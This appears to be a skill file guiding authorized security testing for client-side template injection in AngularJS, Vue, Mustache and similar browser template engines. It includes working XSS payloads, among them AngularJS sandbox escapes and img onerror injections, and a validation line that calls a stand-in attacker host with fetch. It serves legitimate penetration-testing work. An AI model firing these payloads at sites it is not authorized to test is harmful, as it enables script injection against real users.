---
name: client-side-template-injection
description: >-
  Use when authorized testing involves browser-side template engines that
  interpret user input as template syntax - AngularJS expression contexts,
  Vue/React string-built templates, Mustache/Handlebars rendered in the
  browser, Lit-html or other client template DSLs, or any framework where
  user input lands in a template-evaluation sink before being rendered to
  the DOM.
---

# Client-Side Template Injection

CSTI is the browser-side cousin of SSTI. Where server-side template
injection runs in the application's render process, client-side template
injection runs in the victim's browser - so the impact is XSS by
construction, but with framework-specific syntax and a sandbox that may
or may not be bypassable. AngularJS sandbox escapes (now-historical) were
the classic example; modern Vue/React/Mustache CSTI is rarer but real.

## Workflow

1. Read `../../references/scope-safety.md` and the Cross-Site Scripting
   section of `../../references/high-signal-must-tests.md`.
2. Identify the client-side template engine: AngularJS (v1.x), Vue 2/3,
   React (string-built JSX or `dangerouslySetInnerHTML` paired with a
   template), Mustache, Handlebars, Lit-html, Lodash `_.template`,
   nunjucks-in-browser, Liquid-in-browser.
3. Find sinks where user input is inserted into a template expression
   context rather than into rendered text: legacy `ng-bind-html`,
   Vue `v-html`, `v-bind` to component prop that interpolates,
   React's `dangerouslySetInnerHTML` prop (the JSX prop that injects
   raw HTML), Mustache `{{{ }}}` (unescaped), Handlebars triple-stash.
4. Probe with engine-specific syntax: `{{7*7}}` for double-stash
   engines, `${7*7}` for template-literal engines.
5. If the engine has a sandbox, find the escape path appropriate to
   the version.
6. Validate with `alert(document.domain)` against an owned profile or
   harmless DOM marker. Stop after one execution.
7. Write findings with `../../references/finding-output.md`. State the
   engine, version, sink, and the privilege impact.

## Where To Look

- AngularJS v1.x apps still in production (status pages, admin UIs,
  long-tail B2B): user input rendered inside `{{ }}` or via
  `ng-bind-html` with `$sce.trustAsHtml`.
- Vue v-html bindings receiving server-supplied or user-supplied
  content.
- Component libraries that accept "template strings" as props and
  compile them at runtime.
- Email rendering done in-browser (preview panes) using a template
  engine.
- A/B testing or feature-flag systems that interpolate user attributes
  into a script tag context.
- Static-site generators that ship runtime templates and accept
  user-supplied content (comments, forms).

## Common Patterns

- AngularJS sandbox escape via `constructor.constructor(...)` chains
  (works against pre-1.6 only; modern versions removed the sandbox
  entirely so any expression is XSS).
- Vue 2 inline templates with user data: `<div v-html="userInput">`
  followed by Vue interpolating the same context.
- Mustache/Handlebars triple-stash (`{{{userInput}}}`) rendering raw
  HTML, plus a script-friendly context.
- Lodash `_.template(userInput)` invoked client-side.
- Markdown renderers that pass through template syntax before
  sanitisation.
- A library that compiles a template at runtime from a `data-`
  attribute the page reads.

## Protection And Bypass Themes

- Match payload to the exact engine syntax:
  - AngularJS: `{{constructor.constructor('alert(1)')()}}` (older);
    `{{$on.constructor('alert(1)')()}}` (CSP-strict mode variants).
  - Vue: `<div v-html="'<img src=x onerror=alert(1)>'">` if
    v-html binds attacker input.
  - Mustache triple-stash: `{{{<img src=x onerror=alert(1)>}}}`.
- For sandboxed engines (older AngularJS), version-pin the escape
  payload to the exact framework version.
- For modern engines without sandbox, the template-syntax injection
  is itself the XSS - no escape needed.
- Filter bypasses: many sanitisers strip HTML but pass through
  `{{ }}`; the template engine then re-introduces script.
- Some frameworks compile templates only when a flag is set; check
  whether the flag is reachable through user actions.

## Safe Validation

- Owned account, single execution proof (`alert(document.domain)` or
  `fetch('https://attacker.example/?<marker>')`).
- For stored CSTI in profile or comment fields, store one payload,
  prove execution, remove if program rules allow.
- Do not pivot into cookie/token theft or actions against other users.

## Anti-Patterns

- Reporting `{{7*7}}` rendered as `49` as if it were RCE; CSTI is
  XSS-class impact, not SSTI-class.
- Targeting AngularJS sandbox escapes against modern versions (>=
  1.6); they removed the sandbox so the payload simplifies, but the
  PoC must match.
- Confusing CSTI with SSTI - the engine running matters because the
  impact bound (browser vs server) is different. See
  `../blind-ssti/SKILL.md` for server-side.
